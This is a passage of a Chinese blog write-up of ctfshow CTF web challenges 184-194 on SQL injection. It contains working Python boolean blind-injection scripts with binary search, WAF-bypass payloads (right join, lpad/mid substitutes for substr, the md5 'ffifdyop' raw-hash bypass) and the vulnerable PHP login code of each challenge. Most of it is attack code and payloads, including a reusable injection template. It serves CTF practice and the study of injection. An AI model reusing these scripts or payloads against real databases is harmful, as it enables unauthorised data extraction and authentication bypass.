&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><blockquote><p><strong>184</strong> right join on 右连接构造判断表达式</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 注意不要用https://</span></span><br><span class="line">url = <span class="string">&quot;http://29eaa11f-1ab7-4b93-9fb7-bd2b43e3daba.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span>  j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,<span class="subst">&#123;i&#125;</span>,1)regexp(char(<span class="subst">&#123;j&#125;</span>)))&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># right join </span></span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 43;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag.lower())</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(j) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                    flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag.lower()+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><strong>185</strong> 过滤数字,下面是数字构造表</p></blockquote><p><img src="https://gitee.com/eviden/img/raw/master/202409051538851.png" alt="在这里插入图片描述"></p><blockquote><p><strong>187</strong> [SQL绕过]md5($str,true)类型绕过,md5万能密码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = &#x27;<span class="subst">$username</span>&#x27; and password= &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回逻辑</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin可以获得flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不存在&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//万能密码 ffifdyop  129581926211651571912466741651878684928</span></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;ffifdyop&quot;</span>,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><blockquote><p><strong>188</strong>    关于mysql 一个神奇的整数强制转换和查询</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line"> <span class="comment">//用户名检测</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//密码检测</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//密码判断</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">      <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;密码错误!&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//思路:</span></span><br><span class="line"><span class="comment">//首先username肯定通过sql查不出东西的,因为只判断行数</span></span><br><span class="line"><span class="comment">//当查到的行数等于密码的整形值时,就会返回flag</span></span><br><span class="line"><span class="comment">//因为一般的查询行数我们不可知,那么我们可以考虑是否能查出0行的数据来</span></span><br><span class="line">于是想着将 select xxx where <span class="number">0</span></span><br><span class="line">   即将后面的查询条件控制为假</span><br></pre></td></tr></table></figure><blockquote><p><strong>191</strong> 过滤ascii关键字,其实也可以二分注!(利用if条件注入即可)</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">      <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">先看if怎么用</span><br><span class="line">if(substr((<span class="keyword">select</span> f1ag <span class="keyword">from</span> ctfshow_fl0g),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) #给出注入语句</span><br><span class="line">if(<span class="operator">&lt;</span><span class="keyword">condition</span><span class="operator">&gt;</span>, <span class="number">1</span>, <span class="number">0</span>) #总结就是 第一个条件成立返回<span class="literal">true</span>,不成立返回<span class="literal">false</span></span><br><span class="line"><span class="keyword">condition</span>:<span class="comment">--&gt;substr((select f1ag from ctfshow_fl0g),2,1)&gt;&#x27;a&#x27;</span></span><br><span class="line">substr取出子串<span class="number">1</span>位用于与后面的<span class="operator">&gt;</span>进行判断</span><br><span class="line"></span><br><span class="line">或者ord </span><br><span class="line"><span class="number">0</span><span class="string">&#x27;or(ord(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1))&gt;&#123;&#125;)=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202409062348508.png" alt="image-20240906234842332"></p><blockquote><p><strong>193</strong> 盲注过滤substr</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//密码判断</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex|substr/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>这里采用right,或者left关键字</strong></p><p>bool判断的时候要对整个字符子串进行匹配,思路就是判断一个字符就把它加到目标字符串上去</p><p>即被对比的字符串为<code>flag+&#39;chr(mid)&#39;</code></p><blockquote><p><strong>194</strong> left、right、substring、char都不能用了。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这里使用 lpad() 函数</span><br><span class="line">它和<span class="keyword">left</span>()的注入语句类似，只是多了一个填充字符串padstr参数，令其为空即可。</span><br><span class="line">admin<span class="string">&#x27;and ((lpad((select f1ag from ctfshow_flxg),1,&#x27;&#x27;)&gt;&#x27;</span>a<span class="string">&#x27;))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 或者使用mid()函数</span></span><br><span class="line"><span class="string">0&#x27;</span> <span class="keyword">or</span> if(mid((<span class="keyword">select</span> f1ag <span class="keyword">from</span> ctfshow_flxg),&#123;&#125;,<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;&#123;&#125;&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">-- </span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/eviden/img/raw/master/202409072234190.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/eviden/img/raw/master/202409080934597.png" alt="image-20240908093401477"></p><blockquote><h3 id="盲注大法它leile"><a href="#盲注大法它leile" class="headerlink" title="盲注大法它leile~"></a><strong>盲注大法它leile~</strong></h3></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://90a1c915-af7d-4bb9-8069-f2da501eb8f9.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">proxy=&#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:8000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;127.0.0.1:8000&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># payload = &quot;0&#x27;or(ord(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1))&gt;&#123;&#125;)=&#x27;1&quot;</span></span><br><span class="line"><span class="comment"># 如需查询多个字段,则利用列表生成式生成批量sql语句</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">product_muti_sql</span>(<span class="params">begin,end</span>):</span><br><span class="line">    <span class="comment"># 这里给出默认的查所有表名的sql语句生成示例,若需要其他方式自行修改</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">f&quot;select table_name from information_schema.tables where table_schema=database() limit <span class="subst">&#123;j&#125;</span>,1&quot;</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(begin, end+<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">right_boolinjection</span>(<span class="params">method,sql,vulstring</span>):</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="comment"># for asc in range(32,127):</span></span><br><span class="line">        left=<span class="number">32</span></span><br><span class="line">        right=<span class="number">127</span></span><br><span class="line">        mid=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> left&lt;right:</span><br><span class="line">            mid=(left+right)//<span class="number">2</span></span><br><span class="line">            <span class="comment"># sql=f&quot;1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;j&#125;,1),&#123;i&#125;,1))&gt;&#123;mid&#125;--+&quot;</span></span><br><span class="line">            <span class="comment"># select table_name from information_schema.tables where table_schema=database() limit &#123;j&#125;,1</span></span><br><span class="line">            <span class="comment"># payload=f&quot;1&#x27;and ascii(substr((&#123;sql&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;--+&quot;</span></span><br><span class="line">            <span class="comment"># payload=f&quot;0&#x27;or(ord(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;i&#125;,1))&gt;&#123;mid&#125;)=&#x27;1&quot;</span></span><br><span class="line">            <span class="comment"># payload=f&quot;0&#x27;or if(substr((select f1ag from ctfshow_fl0g),&#123;i&#125;,1)&gt;&#x27;&#123;chr(mid)&#125;&#x27;,1,0)=&#x27;1&quot;</span></span><br><span class="line">            payload=sql.<span class="built_in">format</span>(i,flag+<span class="built_in">chr</span>(mid))</span><br><span class="line">            <span class="comment"># 区分发包方法</span></span><br><span class="line">            <span class="keyword">if</span> method==<span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">                re=requests.get(url+<span class="string">&#x27;?id=&#x27;</span>+payload)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                re=requests.post(url,data=&#123;<span class="string">&#x27;username&#x27;</span>:payload,<span class="string">&quot;password&quot;</span> : <span class="number">0</span>,&#125;,proxies=proxy)</span><br><span class="line">            <span class="comment"># 二分法,看不懂的手动模拟一下咯!</span></span><br><span class="line">            <span class="comment"># 判断标志字符串是否在返回包中</span></span><br><span class="line">            <span class="comment"># if &#x27;You are in..........&#x27; in re.text:</span></span><br><span class="line">            <span class="comment"># 后续考虑采用页面相似度算法进行判断,再次佩服sqlmap的作者!</span></span><br><span class="line">            <span class="keyword">if</span> vulstring <span class="keyword">in</span> re.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">                left=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right=mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(left))</span><br><span class="line">        <span class="comment"># 二分最后搜到左边的值返回,检查是否为空,为空则说明字段查询完毕且找不到字符对应查询终止!</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(left)!=<span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            <span class="comment"># print(chr(left),end=&#x27;&#x27;)</span></span><br><span class="line">            flag+=<span class="built_in">chr</span>(left).lower()</span><br><span class="line">            <span class="built_in">print</span>(flag.lower())</span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     break</span></span><br><span class="line">    flag+=<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flag      </span><br><span class="line"><span class="comment"># 注入点,将要验证的sql语句注入到payload中,支持多字段查询!</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_boolinjection</span>(<span class="params">method,sql,vulstring</span>):</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="comment"># for asc in range(32,127):</span></span><br><span class="line">        left=<span class="number">32</span></span><br><span class="line">        right=<span class="number">127</span></span><br><span class="line">        mid=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> left&lt;right:</span><br><span class="line">            mid=(left+right)//<span class="number">2</span></span><br><span class="line">            <span class="comment"># sql=f&quot;1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;j&#125;,1),&#123;i&#125;,1))&gt;&#123;mid&#125;--+&quot;</span></span><br><span class="line">            <span class="comment"># select table_name from information_schema.tables where table_schema=database() limit &#123;j&#125;,1</span></span><br><span class="line">            <span class="comment"># payload=f&quot;1&#x27;and ascii(substr((&#123;sql&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;--+&quot;</span></span><br><span class="line">            <span class="comment"># payload=f&quot;0&#x27;or(ord(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;i&#125;,1))&gt;&#123;mid&#125;)=&#x27;1&quot;</span></span><br><span class="line">            <span class="comment"># payload=f&quot;0&#x27;or if(substr((select f1ag from ctfshow_fl0g),&#123;i&#125;,1)&gt;&#x27;&#123;chr(mid)&#125;&#x27;,1,0)=&#x27;1&quot;</span></span><br><span class="line">            payload=sql.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(mid))</span><br><span class="line">            <span class="comment"># 区分发包方法</span></span><br><span class="line">            <span class="keyword">if</span> method==<span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">                re=requests.get(url+<span class="string">&#x27;?id=&#x27;</span>+payload)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                re=requests.post(url,data=&#123;<span class="string">&#x27;username&#x27;</span>:payload,<span class="string">&quot;password&quot;</span> : <span class="number">0</span>,&#125;,proxies=proxy)</span><br><span class="line">            <span class="comment"># 二分法,看不懂的手动模拟一下咯!</span></span><br><span class="line">            <span class="comment"># 判断标志字符串是否在返回包中</span></span><br><span class="line">            <span class="comment"># if &#x27;You are in..........&#x27; in re.text:</span></span><br><span class="line">            <span class="comment"># 后续考虑采用页面相似度算法进行判断,再次佩服sqlmap的作者!</span></span><br><span class="line">            <span class="keyword">if</span> vulstring <span class="keyword">in</span> re.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">                left=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right=mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(left))</span><br><span class="line">        <span class="comment"># 二分最后搜到左边的值返回,检查是否为空,为空则说明字段查询完毕且找不到字符对应查询终止!</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27; &#x27;</span>&lt;=<span class="built_in">chr</span>(left)&lt;=<span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">            <span class="comment"># print(chr(left),end=&#x27;&#x27;)</span></span><br><span class="line">            flag+=<span class="built_in">chr</span>(left)</span><br><span class="line">            <span class="built_in">print</span>(flag.lower())</span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     break</span></span><br><span class="line">    flag+=<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flag      </span><br><span class="line">    <span class="comment"># print()</span></span><br><span class="line">    <span class="comment"># 重试次数,包括查询到或者没查询到的所有次数.防止发包过多!</span></span><br><span class="line"><span class="comment"># for sql in product_muti_sql(begin=0,end=5):</span></span><br><span class="line"><span class="comment">#     print(run_boolinjection(&#x27;GET&#x27;,sql=sql))</span></span><br><span class="line"><span class="built_in">print</span>(right_boolinjection(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&quot;admin&#x27;and ((lpad((select f1ag from ctfshow_flxg),&#123;&#125;,&#x27;&#x27;)&gt;&#x27;&#123;&#125;&#x27;))#&quot;</span>,<span class="string">&#x27;密码错误&#x27;</span>))</span><br><span class="line"><span class="comment"># 最后给出一些常用的查询默认语句(无waf绕过,最纯真的模式!)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">tips: 一般 limit 3,1 前面这个3是控制位置的,作为可变参数插入到注入模块中!</span></span><br><span class="line"><span class="string">以下所有打&#123;&#125;的变量表示可控</span></span><br><span class="line"><span class="string">查指定数据库的所有表名</span></span><br><span class="line"><span class="string">select table_name from information_schema.tables where table_schema=&quot;security&quot; limit &#123;3&#125;,1</span></span><br><span class="line"><span class="string">查所有的字段名称</span></span><br><span class="line"><span class="string">select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit &#123;1&#125;,1</span></span><br><span class="line"><span class="string">直接查数据</span></span><br><span class="line"><span class="string">select username from users limit &#123;0&#125;,1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a><strong>TODO</strong></h2><ul><li><p>[✅] 完成盲注类型脚本编写,最好带二分法,因为快!</p></li><li><p>[✅] 再次通过sqli-labs靶场锻炼自己的脚本编写能力</p></li><li><p>[✅] 用go实现上述脚本</p></li><li><p>学习堆叠注入绕过tricks,ctfshow</p></li><li><p>实现一般图形化界面完成盲注(这感觉要仔细思考思考!)</p></li></ul><blockquote><h3 id="至此盲注就结束啦"><a href="#至此盲注就结束啦" class="headerlink" title="至此盲注就结束啦!"></a><strong>至此盲注就结束啦!</strong></h3></blockquote><hr><p><strong>bypass汇总:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">||</span> 字符串拼接符合,相当于<span class="keyword">or</span>的作用</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">OR</span> <span class="number">0</span>;  <span class="comment">-- 结果为 1</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span 